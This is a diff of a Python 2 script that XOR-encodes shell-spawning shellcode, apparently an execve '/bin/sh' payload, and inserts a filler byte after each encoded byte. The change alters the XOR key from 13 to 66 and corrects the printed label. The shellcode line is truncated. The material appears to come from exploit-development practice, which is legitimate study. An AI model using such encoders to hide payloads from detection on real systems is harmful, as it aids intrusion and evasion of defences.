@@ -5,14 +5,14 @@ shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x
 encoded = ""
 decoded = ""
 
-print "Encoding via SUB 13 + inserting new byte \\x25"
+print "Encoding via XOR 66 + inserting new byte \\x25"
 
 for y in bytearray(shellcode):
         decoded+= '0x'+'%02x' %y+','
 
 for x in bytearray(shellcode):
         encoded+='0x'
-        x=x^13
+        x=x^66
         encoded+='%02x,'%x
         encoded+='0x%02x,'%0x25
 
